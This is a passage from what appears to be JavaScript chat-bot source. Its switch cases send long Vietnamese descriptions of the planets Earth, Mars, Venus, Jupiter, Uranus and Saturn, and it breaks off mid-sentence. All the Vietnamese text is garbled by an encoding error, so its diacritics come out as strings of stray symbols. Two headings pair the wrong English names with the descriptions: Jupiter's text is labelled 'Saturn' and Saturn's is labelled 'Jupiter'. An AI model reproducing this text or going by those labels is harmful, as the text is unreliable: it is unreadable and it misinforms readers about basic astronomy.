chuy·ªÉn h·∫øt m·ªôt v√≤ng quanh M·∫∑t Tr·ªùi b·∫±ng 365,2564 l·∫ßn qu√£ng th·ªùi gian n√≥ t·ª± quay m·ªôt v√≤ng quanh tr·ª•c c·ªßa m√¨nh. Kho·∫£ng th·ªùi gian n√†y b·∫±ng v·ªõi m·ªôt nƒÉm thi√™n vƒÉn t·ª©c 365,2564 ng√†y trong d∆∞∆°ng l·ªãch. Tr·ª•c t·ª± quay c·ªßa Tr√°i ƒê·∫•t nghi√™ng m·ªôt g√≥c b·∫±ng 23,44¬∞ so v·ªõi tr·ª•c vu√¥ng g√≥c v·ªõi m·∫∑t ph·∫≥ng qu·ªπ ƒë·∫°o, t·∫°o ra s·ª± thay ƒë·ªïi m√πa tr√™n b·ªÅ m·∫∑t c·ªßa Tr√°i ƒê·∫•t trong m·ªôt nƒÉm ch√≠ tuy·∫øn. M·∫∑t TrƒÉng, v·ªá tinh t·ª± nhi√™n duy nh·∫•t c·ªßa Tr√°i ƒê·∫•t, ƒë·ªìng th·ªùi c≈©ng l√† nguy√™n nh√¢n ch√≠nh g√¢y ra hi·ªán t∆∞·ª£ng th·ªßy tri·ªÅu ƒë·∫°i d∆∞∆°ng, b·∫Øt ƒë·∫ßu quay quanh Tr√°i ƒê·∫•t t·ª´ 4,53 t·ª∑ nƒÉm tr∆∞·ªõc, v·∫´n gi·ªØ nguy√™n g√≥c quay ban ƒë·∫ßu theo th·ªùi gian nh∆∞ng ƒëang chuy·ªÉn ƒë·ªông ch·∫≠m d·∫ßn l·∫°i. Trong kho·∫£ng t·ª´ 4,1 ƒë·∫øn 3,8 t·ª∑ nƒÉm tr∆∞·ªõc, s·ª± va ƒë·∫≠p c·ªßa c√°c thi√™n th·∫°ch trong su·ªët th·ªùi k√¨ (C√¥ng ph√° M·∫°nh mu·ªôn) ƒë√£ t·∫°o ra nh·ªØng s·ª± thay ƒë·ªïi ƒë√°ng k·ªÉ tr√™n b·ªÅ m·∫∑t M·∫∑t TrƒÉng.\\nC·∫£ t√†i nguy√™n kho√°ng s·∫£n l·∫´n c√°c s·∫£n ph·∫©m c·ªßa sinh quy·ªÉn Tr√°i ƒê·∫•t ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ cung c·∫•p cho cu·ªôc s·ªëng c·ªßa con ng∆∞·ªùi. D√¢n c∆∞ ƒë∆∞·ª£c chia th√†nh h∆°n h√†ng trƒÉm qu·ªëc gia ƒë·ªôc l·∫≠p, c√≥ quan h·ªá v·ªõi nhau th√¥ng qua c√°c ho·∫°t ƒë·ªông ngo·∫°i giao, du l·ªãch, th∆∞∆°ng m·∫°i, qu√¢n s·ª±. VƒÉn h√≥a lo√†i ng∆∞·ªùi ƒë√£ ph√°t tri·ªÉn t·∫°o n√™n nhi·ªÅu c√°ch nh√¨n v·ªÅ Tr√°i ƒê·∫•t bao g·ªìm vi·ªác nh√¢n c√°ch h√≥a Tr√°i ƒê·∫•t nh∆∞ m·ªôt v·ªã th·∫ßn, ni·ªÅm tin v√†o m·ªôt Tr√°i ƒê·∫•t ph·∫≥ng ho·∫∑c Tr√°i ƒê·∫•t l√† trung t√¢m c·ªßa c·∫£ v≈© tr·ª•, v√† m·ªôt quan ƒëi·ªÉm nh√¨n hi·ªán ƒë·∫°i h∆°n nh∆∞ Tr√°i ƒê·∫•t l√† m·ªôt m√¥i tr∆∞·ªùng th·ªëng nh·∫•t c·∫ßn c√≥ s·ª± ƒë·ªãnh h∆∞·ªõng.\", threadID, messageID); break;\n                case 3: api.sendMessage(\"3. Sao h·ªèa - Mars \\n\\nSao H·ªèa hay H·ªèa tinh (ch·ªØ H√°n: ÁÅ´Êòü, ti·∫øng Anh: Mars) l√† h√†nh tinh th·ª© t∆∞ t√≠nh t·ª´ M·∫∑t Tr·ªùi trong Th√°i D∆∞∆°ng H·ªá. N√≥ th∆∞·ªùng ƒë∆∞·ª£c g·ªçi v·ªõi t√™n kh√°c l√† (H√†nh tinh ƒê·ªè), do s·∫Øt √¥x√≠t c√≥ m·∫∑t r·∫•t nhi·ªÅu tr√™n b·ªÅ m·∫∑t h√†nh tinh l√†m cho b·ªÅ m·∫∑t n√≥ hi·ªán l√™n v·ªõi m√†u ƒë·ªè ƒë·∫∑c tr∆∞ng. Sao H·ªèa l√† m·ªôt h√†nh tinh ƒë·∫•t ƒë√° v·ªõi m·ªôt kh√≠ quy·ªÉn m·ªèng, c√≥ nh·ªØng ƒë·∫∑c ƒëi·ªÉm tr√™n b·ªÅ m·∫∑t c√≥ n√©t gi·ªëng v·ªõi c·∫£ c√°c h·ªë va ch·∫°m tr√™n M·∫∑t TrƒÉng v√† c√°c n√∫i l·ª≠a, thung l≈©ng, sa m·∫°c v√† ch·ªèm bƒÉng ·ªü c·ª±c tr√™n c·ªßa Tr√°i ƒê·∫•t. Chu k·ª≥ t·ª± quay v√† s·ª± tu·∫ßn ho√†n c·ªßa c√°c m√πa tr√™n H·ªèa Tinh kh√° gi·ªëng v·ªõi c·ªßa Tr√°i ƒê·∫•t do ƒë·ªô nghi√™ng c·ªßa tr·ª•c quay t·∫°o ra. Tr√™n Sao H·ªèa c√≥ ng·ªçn n√∫i Olympus Mons, ng·ªçn n√∫i cao nh·∫•t trong H·ªá M·∫∑t Tr·ªùi, v√† h·∫ªm n√∫i Valles Marineris, h·∫ªm n√∫i d√†i v√† r·ªông nh·∫•t trong Th√°i D∆∞∆°ng H·ªá. L√≤ng ch·∫£o Borealis b·∫±ng ph·∫≥ng tr√™n b√°n c·∫ßu b·∫Øc bao ph·ªß t·ªõi 40% di·ªán t√≠ch b·ªÅ m·∫∑t h√†nh tinh ƒë·ªè v√† c√≥ th·ªÉ l√† m·ªôt h·ªë va ch·∫°m kh·ªïng l·ªì trong qu√° kh·ª©.Cho ƒë·∫øn khi t√†u Mariner 4 l·∫ßn ƒë·∫ßu ti√™n bay ngang qua Sao H·ªèa v√†o nƒÉm 1965, ƒë√£ c√≥ nhi·ªÅu suy ƒëo√°n v·ªÅ s·ª± c√≥ m·∫∑t c·ªßa n∆∞·ªõc l·ªèng tr√™n b·ªÅ m·∫∑t h√†nh tinh n√†y. Ch√∫ng d·ª±a tr√™n nh·ªØng quan s√°t v·ªÅ s·ª± bi·∫øn ƒë·ªïi chu k·ª≥ v·ªÅ ƒë·ªô s√°ng v√† t·ªëi c·ªßa nh·ªØng n∆°i tr√™n b·ªÅ m·∫∑t h√†nh tinh, ƒë·∫∑c bi·ªát t·∫°i nh·ªØng vƒ© ƒë·ªô v√πng c·ª±c, n∆°i c√≥ ƒë·∫∑c ƒëi·ªÉm c·ªßa bi·ªÉn v√† l·ª•c ƒë·ªãa; nh·ªØng ƒë∆∞·ªùng k·∫ª s·ªçc d√†i v√† t·ªëi ban ƒë·∫ßu ƒë∆∞·ª£c cho l√† nh·ªØng k√™nh t∆∞·ªõi ti√™u ch·ª©a n∆∞·ªõc l·ªèng. Nh·ªØng ƒë∆∞·ªùng s·ªçc th·∫≥ng n√†y sau ƒë√≥ ƒë∆∞·ª£c gi·∫£i th√≠ch nh∆∞ l√† nh·ªØng ·∫£o ·∫£nh quang h·ªçc, m·∫∑c d√π c√°c ch·ª©ng c·ª© ƒë·ªãa ch·∫•t thu th·∫≠p b·ªüi c√°c t√†u thƒÉm d√≤ kh√¥ng gian cho th·∫•y Sao H·ªèa c√≥ kh·∫£ nƒÉng ƒë√£ t·ª´ng c√≥ n∆∞·ªõc l·ªèng bao ph·ªß tr√™n di·ªán r·ªông ·ªü b·ªÅ m·∫∑t c·ªßa n√≥. NƒÉm 2005, d·ªØ li·ªáu t·ª´ t√≠n hi·ªáu radar cho th·∫•y s·ª± c√≥ m·∫∑t c·ªßa m·ªôt l∆∞·ª£ng l·ªõn n∆∞·ªõc ƒë√≥ng bƒÉng ·ªü hai c·ª±c, v√† t·∫°i c√°c v≈©ng vƒ© ƒë·ªô trung b√¨nh. Robot t·ª± h√†nh Spirit ƒë√£ l·∫•y ƒë∆∞·ª£c m·∫´u c√°c h·ª£p ch·∫•t h√≥a h·ªçc ch·ª©a ph√¢n t·ª≠ n∆∞·ªõc v√†o th√°ng 3 nƒÉm 2007. T√†u ƒë·ªï b·ªô Phoenix ƒë√£ tr·ª±c ti·∫øp l·∫•y ƒë∆∞·ª£c m·∫´u n∆∞·ªõc ƒë√≥ng bƒÉng trong l·ªõp ƒë·∫•t n√¥ng tr√™n b·ªÅ m·∫∑t v√†o ng√†y 31 th√°ng 7 nƒÉm 2008.Sao H·ªèa c√≥ hai v·ªá tinh: Phobos v√† Deimos, ch√∫ng l√† c√°c v·ªá tinh nh·ªè v√† d·ªã h√¨nh. ƒê√¢y c√≥ th·ªÉ l√† c√°c ti·ªÉu h√†nh tinh b·ªã H·ªèa Tinh b·∫Øt ƒë∆∞·ª£c, t∆∞∆°ng t·ª± nh∆∞ 5261 Eureka - m·ªôt ti·ªÉu h√†nh tinh Troia c·ªßa H·ªèa Tinh. Hi·ªán nay c√≥ ba t√†u qu·ªπ ƒë·∫°o c√≤n ho·∫°t ƒë·ªông ƒëang bay quanh Sao H·ªèa: Mars Odyssey, Mars Express, v√† Mars Reconnaissance Orbiter. Tr√™n b·ªÅ m·∫∑t n√≥ c√≥ robot t·ª± h√†nh th√°m hi·ªÉm Sao H·ªèa (Mars Exploration Rover) Opportunity kh√¥ng c√≤n ho·∫°t ƒë·ªông v√† c·∫∑p song sinh v·ªõi n√≥ robot t·ª± h√†nh Spirit ƒë√£ ng·ª´ng ho·∫°t ƒë·ªông, c√πng v·ªõi ƒë√≥ l√† nh·ªØng t√†u ƒë·ªï b·ªô v√† robot t·ª± h√†nh trong qu√° kh·ª©-c·∫£ th√†nh c√¥ng l·∫´n kh√¥ng th√†nh c√¥ng. T√†u ƒë·ªï b·ªô Phoenix ƒë√£ ho√†n th√†nh phi v·ª• c·ªßa n√≥ v√†o nƒÉm 2008. Nh·ªØng quan s√°t b·ªüi t√†u qu·ªπ ƒë·∫°o ƒë√£ ng·ª´ng ho·∫°t ƒë·ªông c·ªßa NASA Mars Global Surveyor ch·ªâ ra ch·ª©ng c·ª© v·ªÅ s·ª± d·ªãch chuy·ªÉn thu nh·ªè v√† m·ªü r·ªông c·ªßa ch·ªèm bƒÉng c·ª±c b·∫Øc theo c√°c m√πa. T√†u qu·ªπ ƒë·∫°o Mars Reconnaissance Orbiter c·ªßa NASA ƒë√£ thu nh·∫≠n ƒë∆∞·ª£c c√°c b·ª©c ·∫£nh cho th·∫•y kh·∫£ nƒÉng c√≥ n∆∞·ªõc ch·∫£y trong nh·ªØng th√°ng n√≥ng nh·∫•t tr√™n sao H·ªèa.Sao H·ªèa c√≥ th·ªÉ d·ªÖ d√†ng nh√¨n t·ª´ Tr√°i ƒê·∫•t b·∫±ng m·∫Øt th∆∞·ªùng. C·∫•p sao bi·ªÉu ki·∫øn c·ªßa n√≥ ƒë·∫°t gi√° tr·ªã ‚àí3,0 ch·ªâ ƒë·ª©ng sau so v·ªõi Sao M·ªôc, Sao Kim, M·∫∑t TrƒÉng, v√† M·∫∑t Tr·ªùi.\", threadID, messageID); break;\n                case 4: api.sendMessage(\"4. Sao Kim - Venus\\n\\nSao Kim (Venus) hay Kim tinh (ch·ªØ H√°n: ÈáëÊòü), c√≤n g·ªçi l√† sao Th√°i B·∫°ch (Â§™ÁôΩ), Th√°i B·∫°ch Kim tinh (Â§™ÁôΩÈáëÊòü), l√† h√†nh tinh th·ª© 2 trong h·ªá M·∫∑t Tr·ªùi, t·ª± quay quanh n√≥ v·ªõi chu k·ª≥ 224,7 ng√†y Tr√°i ƒê·∫•t. X·∫øp sau M·∫∑t TrƒÉng, n√≥ l√† thi√™n th·ªÉ t·ª± nhi√™n s√°ng nh·∫•t trong b·∫ßu tr·ªùi t·ªëi, v·ªõi c·∫•p sao bi·ªÉu ki·∫øn b·∫±ng ‚àí4.6, ƒë·ªß s√°ng ƒë·ªÉ t·∫°o n√™n b√≥ng tr√™n m·∫∑t n∆∞·ªõc. B·ªüi v√¨ Sao Kim l√† h√†nh tinh ph√≠a trong t√≠nh t·ª´ Tr√°i ƒê·∫•t, n√≥ kh√¥ng bao gi·ªù xu·∫•t hi·ªán tr√™n b·∫ßu tr·ªùi m√† qu√° xa M·∫∑t Tr·ªùi: g√≥c ly gi√°c ƒë·∫°t c·ª±c ƒë·∫°i b·∫±ng 47,8¬∞. Sao Kim ƒë·∫°t ƒë·ªô s√°ng l·ªõn nh·∫•t ngay s√°t th·ªùi ƒëi·ªÉm ho√†ng h√¥n ho·∫∑c b√¨nh minh, do v·∫≠y m√† d√¢n gian c√≤n g·ªçi l√† sao H√¥m, khi h√†nh tinh n√†y hi·ªán l√™n l√∫c ho√†ng h√¥n, v√† sao Mai, khi h√†nh tinh n√†y hi·ªán l√™n l√∫c b√¨nh minh.Sao Kim ƒë∆∞·ª£c x·∫øp v√†o nh√≥m h√†nh tinh ƒë·∫•t ƒë√° v√† ƒë√¥i khi ng∆∞·ªùi ta c√≤n coi n√≥ l√† (h√†nh tinh ch·ªã em) v·ªõi Tr√°i ƒê·∫•t do k√≠ch c·ª°, gia t·ªëc h·∫•p d·∫´n, tham s·ªë qu·ªπ ƒë·∫°o g·∫ßn gi·ªëng v·ªõi Tr√°i ƒê·∫•t. Tuy nhi√™n, ng∆∞·ªùi ta ƒë√£ ch·ªâ ra r·∫±ng n√≥ r·∫•t kh√°c Tr√°i ƒê·∫•t tr√™n nh·ªØng m·∫∑t kh√°c. Sao Kim b·ªã bao b·ªçc b·ªüi l·ªõp m√¢y d√†y c√≥ t√≠nh ph·∫£n x·∫° cao ch·ª©a ax√≠t sunfuric, v√† khi·∫øn ch√∫ng ta kh√¥ng th·ªÉ quan s√°t b·ªÅ m·∫∑t c·ªßa n√≥ d∆∞·ªõi b∆∞·ªõc s√≥ng √°nh s√°ng kh·∫£ ki·∫øn. M·∫≠t ƒë·ªô kh√¥ng kh√≠ trong kh√≠ quy·ªÉn c·ªßa n√≥ l·ªõn nh·∫•t trong s·ªë b·ªën h√†nh tinh ƒë·∫•t ƒë√°, th√†nh ph·∫ßn ch·ªß y·∫øu l√† cacbon dioxide. √Åp su·∫•t kh√≠ quy·ªÉn t·∫°i b·ªÅ m·∫∑t h√†nh tinh cao g·∫•p 92 l·∫ßn so v·ªõi c·ªßa Tr√°i ƒê·∫•t. V·ªõi nhi·ªát ƒë·ªô b·ªÅ m·∫∑t trung b√¨nh b·∫±ng 735 K (462 ¬∞C), Sao Kim l√† h√†nh tinh n√≥ng nh·∫•t trong H·ªá M·∫∑t Tr·ªùi. N√≥ kh√¥ng c√≥ chu tr√¨nh cacbon ƒë·ªÉ ƒë∆∞a cacbon tr·ªü l·∫°i ƒë√° v√† ƒë·∫•t tr√™n b·ªÅ m·∫∑t, do v·∫≠y kh√¥ng th·ªÉ c√≥ m·ªôt t·ªï ch·ª©c s·ªëng h·ªØu c∆° n√†o c√≥ th·ªÉ h·∫•p th·ª• n√≥ trong sinh kh·ªëi. M·ªôt s·ªë nh√† khoa h·ªçc t·ª´ng cho r·∫±ng Sao Kim ƒë√£ c√≥ nh·ªØng ƒë·∫°i d∆∞∆°ng trong qu√° kh·ª©, nh∆∞ng ƒë√£ b·ªëc h∆°i khi nhi·ªát ƒë·ªô h√†nh tinh tƒÉng l√™n do hi·ªáu ·ª©ng nh√† k√≠nh m·∫•t ki·ªÉm so√°t. N∆∞·ªõc c√≥ th·ªÉ ƒë√£ b·ªã quang ly, v√† b·ªüi v√¨ kh√¥ng c√≥ t·ª´ quy·ªÉn h√†nh tinh, hiƒër√¥ t·ª± do c√≥ th·ªÉ tho√°t v√†o v≈© tr·ª• b·ªüi t√°c ƒë·ªông c·ªßa gi√≥ M·∫∑t Tr·ªùi. To√†n b·ªô b·ªÅ m·∫∑t c·ªßa Sao Kim l√† m·ªôt hoang m·∫°c kh√¥ c·∫±n v·ªõi ƒë√° v√† b·ª•i v√† c√≥ l·∫Ω v·∫´n c√≤n n√∫i l·ª≠a ho·∫°t ƒë·ªông tr√™n h√†nh tinh n√†y.\", threadID, messageID); break;\n                case 5: api.sendMessage(\"5. Sao M·ªôc - Saturn\\n\\nSao M·ªôc (Jupiter) hay M·ªôc tinh (ch·ªØ H√°n: Êú®Êòü) l√† h√†nh tinh th·ª© nƒÉm t√≠nh t·ª´ M·∫∑t Tr·ªùi v√† l√† h√†nh tinh l·ªõn nh·∫•t trong H·ªá M·∫∑t Tr·ªùi. N√≥ l√† h√†nh tinh kh√≠ kh·ªïng l·ªì v·ªõi kh·ªëi l∆∞·ª£ng b·∫±ng m·ªôt ph·∫ßn ngh√¨n c·ªßa M·∫∑t Tr·ªùi nh∆∞ng b·∫±ng hai l·∫ßn r∆∞·ª°i t·ªïng kh·ªëi l∆∞·ª£ng c·ªßa t·∫•t c·∫£ c√°c h√†nh tinh kh√°c trong H·ªá M·∫∑t Tr·ªùi c·ªông l·∫°i. Sao M·ªôc ƒë∆∞·ª£c x·∫øp v√†o nh√≥m h√†nh tinh kh√≠ kh·ªïng l·ªì c√πng v·ªõi Sao Th·ªï (Sao Thi√™n V∆∞∆°ng v√† Sao H·∫£i V∆∞∆°ng ƒë∆∞·ª£c x·∫øp v√†o h√†nh tinh bƒÉng kh·ªïng l·ªì). Hai h√†nh tinh n√†y ƒë√¥i khi ƒë∆∞·ª£c g·ªçi l√† h√†nh tinh ki·ªÉu Sao M·ªôc  ho·∫∑c h√†nh tinh v√≤ng ngo√†i. C√°c nh√† thi√™n vƒÉn h·ªçc c·ªï ƒë·∫°i ƒë√£ bi·∫øt ƒë·∫øn h√†nh tinh n√†y, v√† g·∫Øn v·ªõi th·∫ßn tho·∫°i v√† ni·ªÅm tin t√¥n gi√°o trong nhi·ªÅu n·ªÅn vƒÉn h√≥a. Ng∆∞·ªùi La M√£ ƒë·∫∑t t√™n h√†nh tinh theo t√™n c·ªßa v·ªã th·∫ßn Jupiter, v·ªã th·∫ßn quan tr·ªçng nh·∫•t trong s·ªë c√°c v·ªã th·∫ßn. T√™n g·ªçi trong ti·∫øng Trung Qu·ªëc, ti·∫øng Tri·ªÅu Ti√™n, ti·∫øng Nh·∫≠t v√† ti·∫øng Vi·ªát c·ªßa h√†nh tinh n√†y ƒë∆∞·ª£c ƒë·∫∑t d·ª±a v√†o h√†nh (m·ªôc)trong ng≈© h√†nh. Khi nh√¨n t·ª´ Tr√°i ƒê·∫•t, Sao M·ªôc c√≥ c·∫•p sao bi·ªÉu ki·∫øn ‚àí2,94, ƒë·ªß s√°ng ƒë·ªÉ t·∫°o b√≥ng; v√† l√† thi√™n th·ªÉ s√°ng th·ª© ba tr√™n b·∫ßu tr·ªùi ƒë√™m sau M·∫∑t TrƒÉng v√† Sao Kim. (Sao H·ªèa h·∫ßu nh∆∞ s√°ng b·∫±ng Sao M·ªôc khi Sao H·ªèa ·ªü nh·ªØng v·ªã tr√≠ xung ƒë·ªëi tr√™n qu·ªπ ƒë·∫°o c·ªßa n√≥ v·ªõi Tr√°i ƒê·∫•t.)Sao M·ªôc ch·ª©a ch·ªß y·∫øu hiƒër√¥ v√† heli - chi·∫øm m·ªôt ph·∫ßn t∆∞ kh·ªëi l∆∞·ª£ng c·ªßa n√≥, m·∫∑c d√π heli ch·ªâ chi·∫øm m·ªôt ph·∫ßn m∆∞·ªùi s·ªë l∆∞·ª£ng ph√¢n t·ª≠. C√≥ th·ªÉ c√≥ m·ªôt l√µi ƒë√° trong h√†nh tinh ch·ª©a c√°c nguy√™n t·ªë n·∫∑ng h∆°n, nh∆∞ng gi·ªëng nh∆∞ nh·ªØng h√†nh tinh kh√≠ kh·ªïng l·ªì kh√°c, Sao M·ªôc kh√¥ng c√≥ m·ªôt b·ªÅ m·∫∑t r·∫Øn ƒë·ªãnh h√¨nh. B·ªüi v√¨ c√≥ t·ªëc ƒë·ªô t·ª± quay nhanh, h√¨nh d·∫°ng c·ªßa h√†nh tinh c√≥ h√¨nh ph·ªèng c·∫ßu d·∫πt (n√≥ h∆°i ph√¨nh ra t·∫°i x√≠ch ƒë·∫°o). L·ªõp kh√≠ quy·ªÉn ngo√†i c√πng hi·ªán l√™n v·ªõi nhi·ªÅu d·∫£i m√¢y ·ªü nh·ªØng ƒë·ªô cao kh√°c nhau, do k·∫øt qu·∫£ c·ªßa hi·ªán t∆∞·ª£ng nhi·ªÖu lo·∫°n kh√≠ ƒë·ªông v√† t∆∞∆°ng t√°c v·ªõi nh·ªØng c∆°n b√£o t·∫°i bi√™n. M·ªôt ƒë·∫∑c ƒëi·ªÉm n·ªïi b·∫≠t tr√™n ·∫£nh ch·ª•p c·ªßa n√≥ ƒë√≥ l√† V·∫øt ƒê·ªè L·ªõn, m·ªôt c∆°n b√£o kh·ªïng l·ªì ƒë∆∞·ª£c bi·∫øt ƒë·∫øn t·ªìn t·∫°i √≠t nh·∫•t t·ª´ th·∫ø k·ª∑ 17 khi c√°c nh√† thi√™n vƒÉn l·∫ßn ƒë·∫ßu ti√™n quan s√°t n√≥ b·∫±ng k√≠nh thi√™n vƒÉn. Bao quanh M·ªôc Tinh l√† m·ªôt h·ªá th·ªëng v√†nh ƒëai m·ªù nh·∫°t c≈©ng nh∆∞ t·ª´ quy·ªÉn m·∫°nh. C√≥ √≠t nh·∫•t 67 v·ªá tinh t·ª± nhi√™n quay quanh n√≥, bao g·ªìm b·ªën v·ªá tinh l·ªõn nh·∫•t g·ªçi l√† c√°c v·ªá tinh Galileo do nh√† b√°c h·ªçc Galileo Galilei l·∫ßn ƒë·∫ßu ti√™n quan s√°t nƒÉm 1610. Ganymede, v·ªá tinh l·ªõn nh·∫•t, c√≥ ƒë∆∞·ªùng k√≠nh l·ªõn h∆°n Sao Th·ªßy.ƒê√£ c√≥ m·ªôt v√†i t√†u kh√¥ng gian th√°m hi·ªÉm ƒë·∫øn Sao M·ªôc, bao g·ªìm t√†u Pioneer v√† Voyager trong c√°c phi v·ª• bay ngang qua v√† sau ƒë√≥ t√†u Galileo bay quay h√†nh tinh n√†y. Con t√†u g·∫ßn ƒë√¢y nh·∫•t bay qua Sao M·ªôc tr√™n h√†nh tr√¨nh ƒë·∫øn Sao Di√™m V∆∞∆°ng - t√†u New Horizons bay qua v√†o cu·ªëi 2007. Con t√†u s·ª≠ d·ª•ng s·ª± h·ªó tr·ª£ c·ªßa h·∫•p d·∫´n t·ª´ Sao M·ªôc nh·∫±m tƒÉng t·ªëc ƒë·ªô c·ªßa n√≥. Hi·ªán nay t√†u Juno c·ªßa NASA ƒë√£ ƒë·∫øn v√†o ng√†y 5 th√°ng 7 nƒÉm 2016. Trong t∆∞∆°ng lai c√≥ phi v·ª• c·ªßa ESA ƒë·∫øn th√°m hi·ªÉm c√°c v·ªá tinh Galileo n√≥i chung v√† Europa n√≥i ri√™ng.\", threadID, messageID); break;\n                case 6: api.sendMessage(\"6. Sao Thi√™n V∆∞∆°ng - Uranus \\n\\nSao Thi√™n V∆∞∆°ng (Uranus) hay Thi√™n V∆∞∆°ng tinh (ch·ªØ H√°n: Â§©ÁéãÊòü) l√† h√†nh tinh th·ª© b·∫£y t√≠nh t·ª´ M·∫∑t Tr·ªùi; l√† h√†nh tinh c√≥ b√°n k√≠nh l·ªõn th·ª© ba v√† c√≥ kh·ªëi l∆∞·ª£ng l·ªõn th·ª© t∆∞ trong H·ªá M·∫∑t Tr·ªùi. Sao Thi√™n V∆∞∆°ng c√≥ th√†nh ph·∫ßn t∆∞∆°ng t·ª± nh∆∞ Sao H·∫£i V∆∞∆°ng. C·∫£ hai c√≥ th√†nh ph·∫ßn h√≥a h·ªçc kh√°c so v·ªõi hai h√†nh tinh kh√≠ kh·ªïng l·ªì l·ªõn h∆°n l√† Sao M·ªôc v√† Sao Th·ªï. V√¨ v·∫≠y, c√°c nh√† thi√™n vƒÉn th·ªânh tho·∫£ng ƒë∆∞a c√°c h√†nh tinh n√†y v√†o danh s√°ch (h√†nh tinh bƒÉng kh·ªïng l·ªì). Kh√≠ quy·ªÉn c·ªßa Sao Thi√™n V∆∞∆°ng t∆∞∆°ng t·ª± nh∆∞ c·ªßa Sao M·ªôc v√† Sao Th·ªï v·ªÅ th√†nh ph·∫ßn c∆° b·∫£n nh∆∞ hiƒër√¥ v√† heli. Kh√°c l√† ch√∫ng ch·ª©a nhi·ªÅu h·ª£p ch·∫•t d·ªÖ bay h∆°i nh∆∞ n∆∞·ªõc, amonia v√† m√™tan c√πng v·ªõi l∆∞·ª£ng nh·ªè hydrocarbon. H√†nh tinh n√†y c√≥ b·∫ßu kh√≠ quy·ªÉn l·∫°nh nh·∫•t trong s·ªë c√°c h√†nh tinh trong H·ªá M·∫∑t Tr·ªùi, v·ªõi nhi·ªát ƒë·ªô c·ª±c ti·ªÉu b·∫±ng 49 K (‚àí224 ¬∞C). N√≥ c√≥ c·∫•u tr√∫c t·∫ßng m√¢y ph·ª©c t·∫°p. Kh·∫£ nƒÉng nh·ªØng ƒë√°m m√¢y th·∫•p nh·∫•t ch·ª©a ch·ªß y·∫øu n∆∞·ªõc trong khi m√™tan l·∫°i chi·∫øm ch·ªß y·∫øu trong nh·ªØng t·∫ßng m√¢y ph√≠a tr√™n. Ng∆∞·ª£c l·∫°i, c·∫•u tr√∫c b√™n trong Sao Thi√™n V∆∞∆°ng ch·ªâ ch·ª©a ch·ªß y·∫øu m·ªôt l√µi bƒÉng v√† ƒë√°.Gi·ªëng nh∆∞ nh·ªØng h√†nh tinh kh√≠ kh·ªïng l·ªì kh√°c, Sao Thi√™n V∆∞∆°ng c√≥ m·ªôt h·ªá th·ªëng v√†nh ƒëai, t·ª´ quy·ªÉn v√† r·∫•t nhi·ªÅu v·ªá tinh t·ª± nhi√™n. H·ªá th·ªëng Sao Thi√™n V∆∞∆°ng c√≥ c·∫•u tr√∫c ƒë·ªôc nh·∫•t b·ªüi v√¨ tr·ª•c t·ª± quay c·ªßa n√≥ b·ªã nghi√™ng r·∫•t l·ªõn, g·∫ßn nh∆∞ song song v·ªõi m·∫∑t ph·∫≥ng qu·ªπ ƒë·∫°o c·ªßa h√†nh tinh. Do v·∫≠y c·ª±c b·∫Øc v√† c·ª±c nam c·ªßa h√†nh tinh n√†y n·∫±m g·∫ßn nh∆∞ t·∫°i v·ªã tr√≠ x√≠ch ƒë·∫°o so v·ªõi nh·ªØng h√†nh tinh kh√°c. NƒÉm 1986, nh·ªØng ·∫£nh ch·ª•p c·ªßa t√†u kh√¥ng gian Voyager 2 cho th·∫•y Sao Thi√™n V∆∞∆°ng qua √°nh s√°ng kh·∫£ ki·∫øn hi·ªán l√™n v·ªõi m·ªôt m√†u g·∫ßn nh∆∞ ƒë·ªìng nh·∫•t m√† kh√¥ng c√≥ c√°c d·∫£i m√¢y hay c∆°n b√£o nh∆∞ nh·ªØng h√†nh tinh kh√≠ kh·ªïng l·ªì kh√°c. C√°c nh√† thi√™n vƒÉn th·ª±c hi·ªán quan s√°t t·ª´ m·∫∑t ƒë·∫•t ph√°t hi·ªán ra d·∫•u hi·ªáu c·ªßa s·ª± thay ƒë·ªïi m√πa v√† s·ª± gia tƒÉng ho·∫°t ƒë·ªông th·ªùi ti·∫øt trong nh·ªØng nƒÉm g·∫ßn ƒë√¢y khi n√≥ ti·∫øp c·∫≠n ƒë·∫øn v·ªã tr√≠ ƒëi·ªÉm ph√¢n tr√™n qu·ªπ ƒë·∫°o. T·ªëc ƒë·ªô gi√≥ tr√™n Sao Thi√™n V∆∞∆°ng ƒë·∫°t t·ªõi 250 m√©t tr√™n gi√¢y (900 km/h).\", threadID, messageID); break;\n                case 7: api.sendMessage(\"7.Sao Th·ªï - Jupiter\\n\\nSao Th·ªï (Saturn) t·ª©c Th·ªï tinh (ch·ªØ H√°n: ÂúüÊòü) l√† h√†nh tinh th·ª© s√°u t√≠nh theo kho·∫£ng c√°ch trung b√¨nh t·ª´ M·∫∑t Tr·ªùi v√† l√† h√†nh tinh l·ªõn th·ª© hai v·ªÅ ƒë∆∞·ªùng k√≠nh c≈©ng nh∆∞ kh·ªëi l∆∞·ª£ng, sau Sao M·ªôc trong H·ªá M·∫∑t Tr·ªùi. T√™n ti·∫øng Anh c·ªßa h√†nh tinh mang t√™n th·∫ßn Saturn trong th·∫ßn tho·∫°i La M√£, k√Ω hi·ªáu thi√™n vƒÉn c·ªßa h√†nh tinh l√† (‚ôÑ) th·ªÉ hi·ªán c√°i li·ªÅm c·ªßa th·∫ßn. Sao Th·ªï l√† h√†nh tinh kh√≠ kh·ªïng l·ªì v·ªõi b√°n k√≠nh trung b√¨nh b·∫±ng 9 l·∫ßn c·ªßa Tr√°i ƒê·∫•t. Tuy kh·ªëi l∆∞·ª£ng c·ªßa h√†nh tinh cao g·∫•p 95 l·∫ßn kh·ªëi l∆∞·ª£ng c·ªßa Tr√°i ƒê·∫•t nh∆∞ng v·ªõi th·ªÉ t√≠ch l·ªõn h∆°n 763 l·∫ßn, kh·ªëi l∆∞·ª£ng ri√™ng trung b√¨nh c·ªßa Sao Th·ªï ch·ªâ b·∫±ng m·ªôt ph·∫ßn t√°m so v·ªõi c·ªßa Tr√°i ƒê·∫•t.C·∫•u tr√∫c b√™n trong c·ªßa Sao Th·ªï c√≥ l·∫Ω bao g·ªìm m·ªôt l√µi s·∫Øt, nikel v√† ƒë√° (h·ª£p ch·∫•t silic v√† √¥xy), bao quanh b·ªüi m·ªôt l·ªõp d√†y hiƒër√¥ kim lo·∫°i, m·ªôt l·ªõp trung gian gi·ªØa hiƒër√¥ l·ªèng v·ªõi heli l·ªèng v√† b·∫ßu kh√≠ quy·ªÉn b√™n tr√™n c√πng. H√¨nh ·∫£nh h√†nh tinh c√≥ m√†u s·∫Øc v√†ng nh·∫°t l√† do s·ª± c√≥ m·∫∑t 